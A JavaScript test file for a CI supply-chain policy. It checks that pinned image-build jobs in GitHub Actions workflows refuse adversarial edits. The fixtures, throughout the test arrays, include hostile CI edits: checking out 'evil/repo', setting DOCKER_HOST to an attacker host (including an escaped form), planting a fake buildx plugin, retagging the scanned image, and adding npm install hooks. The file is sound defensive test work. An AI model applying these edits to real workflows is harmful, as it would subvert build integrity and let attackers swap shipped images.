// Every job that builds, publishes, signs, attests, imports or tests an image is pinned in
// full in pinned-jobs.yaml (#488). Each fixture below is an edit an adversarial review made
// to a real workflow, which the earlier checks accepted.
import assert from "node:assert/strict";
import { test } from "node:test";
import { SHA, actionName, loadWorkflow, parseStrict, readLocalFromRepo, stepsOf, toData } from "./lib.mjs";
import { PINNED_JOB_INPUTS, PINNED_JOBS_FILE, currentPins, pinnedJobInputViolations, npmrcViolations, pinnedJobViolations, pinnedNpmViolations, pythonIsolationViolations, readPinnedJobs, stagingCandidateViolations, stagingOverlayFiles } from "./policy.mjs";

const CHECKOUT = "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1";
const DOWNLOAD = "actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333";
const workflowNames = ["image", "branch-images", "loadtest-image", "oci-import", "prune-dev-images", "ci"];
const readMutated = (name, mutate) => {
  const all = Object.fromEntries(workflowNames.map(n => [`.github/workflows/${n}.yml`, structuredClone(loadWorkflow(n))]));
  mutate(all[`.github/workflows/${name}.yml`]);
  return file => all[file];
};
const indexOf = (job, action) => stepsOf(job).findIndex(s => actionName(s.uses ?? "") === action);
const beforeBuild = (data, job, step) => data.jobs[job].steps.splice(indexOf(data.jobs[job], "docker/build-push-action"), 0, step);
const afterScan = (data, step) => data.jobs["staging-image"].steps.splice(stepsOf(data.jobs["staging-image"]).findIndex(s => s.name === "Scan the candidate image and the arm64 runtime base") + 1, 0, step);
const refused = (name, mutate) => pinnedJobViolations(currentPins(readMutated(name, mutate)), readPinnedJobs());

test("the pinned jobs match the workflows", () => {
  assert.deepEqual(pinnedJobViolations(currentPins(), readPinnedJobs()), []);
});

const EDITS = [
  ["G: checkout of another repository over the workspace", "image", d => beforeBuild(d, "build", { uses: CHECKOUT, with: { repository: "evil/repo", path: "." } })],
  ["H: download-artifact from another repository", "ci", d => beforeBuild(d, "staging-image", { uses: DOWNLOAD, with: { repository: "evil/repo", "run-id": "1", "github-token": "${{ github.token }}" } })],
  ["F: printf over the Dockerfile", "branch-images", d => beforeBuild(d, "build", { run: "printf 'FROM alpine:latest\\n' > Dockerfile" })],
  ["X: a fake buildx plugin", "loadtest-image", d => beforeBuild(d, "build", { run: "mkdir -p ~/.docker/cli-plugins && cp tools/evil ~/.docker/cli-plugins/docker-buildx" })],
  ["X: a Docker config with currentContext", "image", d => beforeBuild(d, "build", { run: "echo '{\"currentContext\":\"evil\"}' > ~/.docker/config.json" })],
  ["E: a docker wrapper first on PATH", "ci", d => beforeBuild(d, "staging-image", { run: 'echo "$PWD/tools/bin" >> "$GITHUB_PATH"' })],
  ["D: DOCKER_HOST written in pieces to GITHUB_ENV", "ci", d => beforeBuild(d, "staging-image", { run: 'echo "DOCKER_""HOST=tcp://evil:2375" >> "$GITHUB_ENV"' })],
  ["P: PLATFORM_PAIR injecting url= into the cache scope", "image", d => beforeBuild(d, "build", { run: 'echo "PLATFORM_PAIR=x,url=https://evil.example" >> "$GITHUB_ENV"' })],
  ["A: docker pull and tag over the image under test after the scan", "ci", d => afterScan(d, { run: "docker pull alpine:latest && docker tag alpine:latest open-model-gateway:staging" })],
  ["B: docker load over the image under test after the scan", "ci", d => afterScan(d, { run: "docker load -i tools/evil.tar" })],
  ["B: skopeo retagging the image under test after the scan", "ci", d => afterScan(d, { run: "skopeo copy docker://alpine:latest docker-daemon:open-model-gateway:staging" })],
  ["C: a build through a variable command word", "ci", d => afterScan(d, { run: "d=docker; $d build -t open-model-gateway:staging ." })],
  ["I2: a python step that builds", "image", d => beforeBuild(d, "build", { shell: "python", run: "import subprocess; subprocess.run(['docker', 'build', '.'])" })],
  ["S: a custom step shell that is itself a build", "ci", d => afterScan(d, { shell: "docker build -t open-model-gateway:staging . && bash {0}", run: "true" })],
  ["a changed step input", "image", d => { d.jobs.build.steps[indexOf(d.jobs.build, "docker/build-push-action")].with["cache-from"] = "type=registry,ref=ghcr.io/evil/cache"; }],
  ["a removed step", "branch-images", d => { d.jobs.build.steps.splice(indexOf(d.jobs.build, "actions/upload-artifact"), 1); }],
  ["reordered steps", "loadtest-image", d => { const s = d.jobs.build.steps; [s[0], s[1]] = [s[1], s[0]]; }],
  ["another job permission", "image", d => { d.jobs.verify.permissions = { contents: "read", packages: "write" }; }],
  ["another job env", "ci", d => { d.jobs["staging-image"].env.DOCKER_HOST = "tcp://evil:2375"; }],
  ["another job container", "oci-import", d => { d.jobs.import.container = `mirror.gcr.io/library/alpine@sha256:${"a".repeat(64)}`; }],
  ["another matrix leg", "image", d => { d.jobs.build.strategy.matrix.include.push({ platform: "linux/s390x", runner: "ubuntu-24.04" }); }],
  ["another job output", "image", d => { d.jobs.build.outputs.extra = "${{ steps.x.outputs.y }}"; }],
  ["another workflow env", "image", d => { d.env.DOCKER_BUILDKIT = "0"; }],
  ["another workflow trigger", "branch-images", d => { d.on.pull_request_target = {}; }],
  ["a new job in a pinned workflow", "loadtest-image", d => { d.jobs.extra = { "runs-on": "ubuntu-24.04", steps: [{ run: "true" }] }; }],
  ["a removed pinned job", "ci", d => { delete d.jobs["staging-image"]; }],
  ["an action at another commit", "oci-import", d => { d.jobs.tools.steps[indexOf(d.jobs.tools, "actions/checkout")].uses = `actions/checkout@${SHA(7)}`; }],
];
for (const [label, name, mutate] of EDITS) {
  test(`a pinned image job refuses ${label}`, () => {
    const found = refused(name, mutate);
    assert.ok(found.length > 0 && found.every(v => v.includes(`update the pinned job in ${PINNED_JOBS_FILE}, which a reviewer must read`)), found.join("; "));
  });
}

// ---- what the pinned jobs run from the repository ----

const SETUP_NODE = ".github/actions/setup-node/action.yml";
const readWithAction = mutate => {
  const read = readMutated("ci", () => {});
  const action = toData(parseStrict(readLocalFromRepo(SETUP_NODE), SETUP_NODE));
  mutate(action);
  return file => (file === SETUP_NODE ? action : read(file) ?? toData(parseStrict(readLocalFromRepo(file), file)));
};
const LOCAL_ACTION_EDITS = [
  ["a retag appended to setup-node", a => { a.runs.steps.at(-1).run += "\ndocker pull busybox && docker tag busybox open-model-gateway:staging\n"; }],
  ["an escaped DOCKER_HOST written to GITHUB_ENV in setup-node", a => { a.runs.steps.at(-1).run += "\nprintf 'DOCKER_\\x48OST=tcp://evil:2375\\n' >> \"$GITHUB_ENV\"\n"; }],
  ["another setup-node input", a => { a.inputs = { version: { default: "latest" } }; }],
];
for (const [label, mutate] of LOCAL_ACTION_EDITS) {
  test(`a local action used by a pinned job refuses ${label}`, () => {
    const found = pinnedJobViolations(currentPins(readWithAction(mutate)), readPinnedJobs());
    assert.ok(found.length > 0 && found.every(v => v.includes(`update the pinned job in ${PINNED_JOBS_FILE}`)), found.join("; "));
  });
}

test("the files the pinned jobs run are the listed PINNED_JOB_INPUTS", () => {
  assert.deepEqual(pinnedJobInputViolations(currentPins()), []);
  assert.ok(PINNED_JOB_INPUTS.includes("scripts/staging.py") && PINNED_JOB_INPUTS.includes(".github/scripts/fetch-verified.sh"), "the list is not empty");
});

const NEW_INPUTS = [
  ["a new script in a run line", "image", d => beforeBuild(d, "build", { run: "bash .github/scripts/new-step.sh" })],
  ["a new python script", "ci", d => afterScan(d, { run: "python3 -I scripts/other.py" })],
  ["a new npm script", "ci", d => afterScan(d, { run: "npm run test:web" })],
];
for (const [label, name, mutate] of NEW_INPUTS) {
  test(`a pinned job refuses ${label} until it is listed`, () => {
    assert.match(pinnedJobInputViolations(currentPins(readMutated(name, mutate))).join(), /is run by a pinned job but not listed in PINNED_JOB_INPUTS/);
  });
}

test("the staging rehearsal runs the candidate image under test", () => {
  const file = "deploy/staging/compose.yaml";
  const compose = () => toData(parseStrict(readLocalFromRepo(file), file));
  const example = readLocalFromRepo("deploy/staging/staging.env.example");
  const ci = loadWorkflow("ci");
  assert.deepEqual(stagingCandidateViolations(compose(), example, ci), []);
  const released = compose();
  released.services.gateway.image = "ghcr.io/ncecere/open-model-gateway:v0.4.1";
  assert.match(stagingCandidateViolations(released, example, ci).join(), /service 'gateway' image .* is not the candidate/);
  const migrate = compose();
  migrate.services.migrate.image = "ghcr.io/ncecere/open-model-gateway:v0.4.1";
  assert.match(stagingCandidateViolations(migrate, example, ci).join(), /service 'migrate' image .* is not the candidate/);
  assert.match(stagingCandidateViolations(compose(), example.replace("GATEWAY_IMAGE=open-model-gateway:staging", "GATEWAY_IMAGE=ghcr.io/ncecere/open-model-gateway:v0.4.1"), ci).join(), /staging\.env\.example/);
});

// ---- what the staging rehearsal and the pinned npm and Python commands read ----

const STAGING_COMPOSE = "deploy/staging/compose.yaml";
const readYaml = file => toData(parseStrict(readLocalFromRepo(file), file));
const EXAMPLE = readLocalFromRepo("deploy/staging/staging.env.example");
const overlays = () => Object.fromEntries(stagingOverlayFiles().map(file => [file, readYaml(file)]));
const candidate = (example = EXAMPLE, layers = overlays()) => stagingCandidateViolations(readYaml(STAGING_COMPOSE), example, loadWorkflow("ci"), layers);

test("staging.py's Compose overlays are the four staging overlay files", () => {
  assert.deepEqual(stagingOverlayFiles().sort(), ["deploy/staging/compose.anthropic.yaml", "deploy/staging/compose.oidc-secret.yaml", "deploy/staging/compose.oidc.yaml", "deploy/staging/compose.openai.yaml"]);
  assert.deepEqual(candidate(), []);
});

const REFUSED_EXAMPLES = [
  ["a second GATEWAY_IMAGE with a leading space", `${EXAMPLE}\n GATEWAY_IMAGE=mirror.gcr.io/library/alpine:latest\n`, /GATEWAY_IMAGE/],
  ["a second GATEWAY_IMAGE with the candidate", `${EXAMPLE}\nGATEWAY_IMAGE=open-model-gateway:staging\n`, /more than once/],
  ["DOCKER_HOST", `${EXAMPLE}\nDOCKER_HOST=tcp://evil:2375\n`, /DOCKER_HOST selects a builder or changes the Docker client/],
  ["DOCKER_CONTEXT", `${EXAMPLE}\nDOCKER_CONTEXT=evil\n`, /DOCKER_CONTEXT/],
  ["DOCKER_CONFIG", `${EXAMPLE}\nDOCKER_CONFIG=/tmp/evil\n`, /DOCKER_CONFIG/],
  ["BUILDX_BUILDER", `${EXAMPLE}\nBUILDX_BUILDER=evil\n`, /BUILDX_BUILDER/],
  ["COMPOSE_FILE", `${EXAMPLE}\nCOMPOSE_FILE=/tmp/evil.yml\n`, /COMPOSE_FILE/],
];
for (const [label, example, reason] of REFUSED_EXAMPLES) {
  test(`staging.env.example refuses ${label}`, () => assert.match(candidate(example).join(), reason));
}

test("staging.env.example is read as staging.py reads it (quotes and spaces stripped)", () => {
  assert.deepEqual(candidate(EXAMPLE.replace("GATEWAY_IMAGE=open-model-gateway:staging", '  GATEWAY_IMAGE="open-model-gateway:staging"')), []);
});

const REFUSED_OVERLAYS = [
  ["an image on the gateway", "deploy/staging/compose.oidc.yaml", d => { d.services ??= {}; d.services.gateway = { ...d.services.gateway, image: "ghcr.io/ncecere/open-model-gateway:v0.4.1" }; }, /compose\.oidc\.yaml: service 'gateway' may not set image/],
  ["an image on an ops service", "deploy/staging/compose.openai.yaml", d => { d.services ??= {}; d.services.migrate = { image: "ghcr.io/ncecere/open-model-gateway:v0.4.1" }; }, /service 'migrate' may not set image/],
  ["a build override", "deploy/staging/compose.anthropic.yaml", d => { d.services ??= {}; d.services.gateway = { ...d.services.gateway, build: { context: "../..", dockerfile: "Dockerfile" } }; }, /service 'gateway' may not set build/],
  ["a new service with a build", "deploy/staging/compose.oidc-secret.yaml", d => { d.services ??= {}; d.services.extra = { build: { context: "../.." } }; }, /service 'extra' may not set build/],
];
for (const [label, file, mutate, reason] of REFUSED_OVERLAYS) {
  test(`a staging overlay refuses ${label}`, () => {
    const layers = overlays();
    layers[file] ??= readYaml(file);
    mutate(layers[file]);
    assert.match(candidate(EXAMPLE, layers).join(), reason);
  });
}

const PACKAGES = () => ({ "package.json": JSON.parse(readLocalFromRepo("package.json")), "apps/web/package.json": JSON.parse(readLocalFromRepo("apps/web/package.json")) });
test("the npm scripts the pinned jobs run have no pre or post scripts", () => {
  assert.deepEqual(pinnedNpmViolations(currentPins(), PACKAGES()), []);
});
const REFUSED_NPM = [
  ["a pre script", p => { p["package.json"].scripts["pretest:container"] = "docker tag busybox open-model-gateway:staging"; }, /pretest:container runs with/],
  ["a post script", p => { p["package.json"].scripts["posttest:container"] = "true"; }, /posttest:container runs with/],
];
for (const [label, mutate, reason] of REFUSED_NPM) {
  test(`a pinned npm script refuses ${label}`, () => {
    const packages = PACKAGES();
    mutate(packages);
    assert.match(pinnedNpmViolations(currentPins(), packages).join(), reason);
  });
}
const INSTALL_SCRIPTS = [
  ["prepare in the root package", p => { p["package.json"].scripts.prepare = "node x.cjs"; }],
  ["postinstall in the root package", p => { p["package.json"].scripts.postinstall = "node x.cjs"; }],
  ["preinstall in the web workspace", p => { p["apps/web/package.json"].scripts.preinstall = "node x.cjs"; }],
];
for (const [label, mutate] of INSTALL_SCRIPTS) {
  test(`npm ci in a pinned job refuses ${label}`, () => {
    const packages = PACKAGES();
    mutate(packages);
    const pins = currentPins(readMutated("ci", d => afterScan(d, { run: "npm ci" })));
    assert.match(pinnedNpmViolations(pins, packages).join(), /runs during npm ci/);
  });
}

test("no .npmrc is tracked", () => {
  assert.deepEqual(npmrcViolations(), []);
  for (const file of [".npmrc", "apps/web/.npmrc"]) assert.match(npmrcViolations([file, "package.json"]).join(), /\.npmrc changes how npm runs scripts/, file);
});

test("every Python program a pinned job runs is started isolated (-I)", () => {
  assert.deepEqual(pythonIsolationViolations(currentPins()), []);
  for (const run of ["python3 scripts/staging.py status", "python3 -B scripts/staging.py status", "python scripts/x.py", "python3 -m json.tool x", "python3 - <<'EOF'\nprint(1)\nEOF"]) {
    assert.match(pythonIsolationViolations(currentPins(readMutated("ci", d => afterScan(d, { run })))).join(), /runs Python without -I/, run);
  }
  assert.deepEqual(pythonIsolationViolations(currentPins(readMutated("ci", d => afterScan(d, { run: "python3 -I scripts/staging.py status" })))), []);
});
